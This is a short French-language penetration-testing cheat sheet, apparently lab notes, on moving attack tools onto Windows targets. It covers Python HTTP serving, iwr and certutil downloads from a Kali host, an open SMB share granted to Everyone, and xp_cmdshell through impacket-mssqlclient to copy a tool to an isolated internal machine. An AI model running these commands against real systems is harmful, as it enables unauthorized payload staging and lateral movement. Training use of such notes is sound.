# Serveur Python 

En premier, il faut lancer un serveur Python dans le dossier contenant les fichiers à importer:
```
python3 -m http.server 80
```

# Sous Windows
```powershell
iwr http://<ip_kali>:<HttpKaliPort>/<tool> -o <tool>
```

```cmd
certutil.exe -urlcache -f http://<targetIP>/<tool> <tool>
```

# Téléchargement d'un outil sur une machine interne n'ayant pas accès à l'extérieur
Architecture :
    
    Kali <----> MS01 <-----> MS02

### Creation d'un SMB à l'intérieur de la machine ayant accès à l'extérieur
MS02 n'a pas accès à Kali directement.
On va activer un partage sur MS01 puis transférer le programme sur MSO2 :
```
net share Myshare=c:\Users\eric.wallows /GRANT:Everyone,FULL

icacls "C:\Users\eric.wallows\sp.exe" /grant Everyone:R

icacls "C:\Users\eric.wallows" /grant Everyone:RX

```

### Activation d'un lecteur Z sur MS02 pointant sur le partage de MS01
exemple si on utilise impacket-mssqlclient :
```
EXEC xp_cmdshell 'net use Z: \\10.10.187.147\Myshare';

```

### Téléchargement d'un outil
exemple si on utilise impacket-mssqlclient :
```
EXEC xp_cmdshell 'copy Z:\sp.exe C:\Users\Public\sp.exe';
```
